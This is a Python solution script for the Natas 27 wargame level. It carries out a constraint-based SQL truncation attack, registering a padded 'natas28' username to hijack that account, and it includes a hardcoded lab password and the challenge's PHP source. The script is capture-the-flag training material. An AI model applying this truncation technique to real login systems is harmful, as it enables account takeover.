import requests
import bs4
import re


# configuration for natas27
USERNAME = 'natas27'
PASSWORD = '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)
URL = 'http://natas27.natas.labs.overthewire.org/'

session = requests.Session()
session.auth = AUTH
# get the challenge content
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


# get the source
response = session.get(URL + 'index-source.html')
# print(response.text)


"""
if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas27', '<censored>');
    mysql_select_db('natas27', $link);
   

    if(validUser($link,$_REQUEST["username"])) {
        //user exists, check creds
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
            echo "Here is your data:<br>";
            $data=dumpData($link,$_REQUEST["username"]);
            print htmlentities($data);
        }
        else{
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }        
    } 
    else {
        //user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){ 
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
        }
    }

    mysql_close($link);
}
"""
# in the source code, note that if the user doesn't exist it will create a new one with the given username and password
# this is done by inserting the username and the password into the sql database
# otherwise, if the user exists, it will check whether the supplied password matches the one used by the existing user
# if the password matches, then it will dump the user data


# one attack that can be done here is Constraint-based SQL attack
# reference: https://dhavalkapil.com/blogs/SQL-Attack-Constraint-Based/


# firstly, we need to confirm that natas28 exists in the database
params = {
    "username" : "natas28",
    "password" : "randompassword"
}
response = session.get(URL, params=params)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')
# note that the above request returns the following
"""
Wrong password for user: natas28
"""
# thus, we confirmed that natas28 does exist in the database


# next, note that in the database schema, the maximum length of the username is 64 characters
"""
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/ 
"""
# based on the reference site, we can skip the validUser() check by creating a new username
# prefixed with natas28 and make it longer than 64 characters, i.e. by padding with whitespaces
# and add any character at the end
new_username = 'natas28' + ' ' * 64 + 'a'
print(f'{new_username}\n')
# we can skip the validUser() check because it will not trim the username and pass it as-is
# therefore, comparing the new username above with natas28 will return False


# since validUser() check will be skipped, it will create a new user
# when inserting a new user, however, mysql will remove any character after the constraint
# in this case, it will only take the first 64 characters
params = {
    "username" : new_username,
    "password" : "randompassword"
}
response = session.get(URL, params=params)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')